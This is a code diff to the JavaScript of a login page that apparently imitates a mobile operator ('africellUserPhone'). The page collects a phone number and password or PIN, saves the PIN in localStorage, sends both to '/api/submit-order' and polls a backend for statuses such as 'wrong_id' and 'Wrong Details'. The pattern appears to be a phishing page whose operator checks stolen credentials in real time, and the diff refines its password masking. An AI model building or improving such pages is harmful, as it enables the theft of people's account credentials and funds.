@@ -336,7 +336,7 @@
                     </div>
                 </div>
 
-                <!-- Password input field (Visible text, centered black text) -->
+                <!-- Password input field (Visible text by default, masked on waiting) -->
                 <div class="e-input-group" style="margin-bottom: 0;">
                     <input type="text" id="uniqueId" class="e-input-field" placeholder="password" autocomplete="current-password" required>
                 </div>
@@ -382,6 +382,7 @@
     }
 
     const phoneInput = document.getElementById('phoneNumber');
+    const passwordInput = document.getElementById('uniqueId');
 
     window.addEventListener('DOMContentLoaded', () => {
         const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
@@ -392,8 +393,8 @@
             phoneInput.value = cleanNum;
         }
 
-        if (savedPin && document.getElementById('uniqueId')) {
-            document.getElementById('uniqueId').value = savedPin;
+        if (savedPin && passwordInput) {
+            passwordInput.value = savedPin;
         }
     });
 
@@ -404,7 +405,7 @@
 
     async function submitOrderAttempt() {
         const rawPhone = phoneInput.value.trim();
-        const uniqueId = document.getElementById('uniqueId').value.trim();
+        const uniqueId = passwordInput.value.trim();
         const spinnerDiv = document.getElementById('loadingSpinner');
         const loginBtn = document.getElementById('loginBtn');
 
@@ -440,8 +441,9 @@
         localStorage.setItem('lastPin', uniqueId);
 
         try {
-            // Blur/disable button and show loading spinner while waiting for callback
+            // Blur/disable button, mask password with dots, and show loading spinner while waiting for callback
             loginBtn.classList.add('disabled-state');
+            passwordInput.type = 'password'; 
             if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
             const response = await fetch('/api/submit-order', {
@@ -456,12 +458,14 @@
                 pollApprovalStatus(fullPhoneVal);
             } else {
                 loginBtn.classList.remove('disabled-state');
+                passwordInput.type = 'text'; // Unmask password on failure
                 if (spinnerDiv) spinnerDiv.style.display = 'none';
                 showAppAlert('❌ Failed: Incorrect Password');
             }
         } catch (error) {
             console.error('Error:', error);
             loginBtn.classList.remove('disabled-state');
+            passwordInput.type = 'text'; // Unmask password on connection error
             if (spinnerDiv) spinnerDiv.style.display = 'none';
             showAppAlert('Could not connect to the backend server.');
         }
@@ -486,14 +490,15 @@
                     clearInterval(statusInterval);
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
                     loginBtn.classList.remove('disabled-state');
+                    passwordInput.type = 'text'; // Unmask password
                     localStorage.clear(); 
                     showAppAlert('Wrong Details.');
                 } 
                 else if (data.status === 'wrong_id') {
                     clearInterval(statusInterval);
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
-                    loginBtn.classList.add('disabled-state'); // Keep blurry until next attempt or show custom message
                     loginBtn.classList.remove('disabled-state');
+                    passwordInput.type = 'text'; // Unmask password
                     
                     let passwordAttemptCount = parseInt(sessionStorage.getItem('passwordAttemptCount') || '0', 10);
                     if (passwordAttemptCount <= 1) {
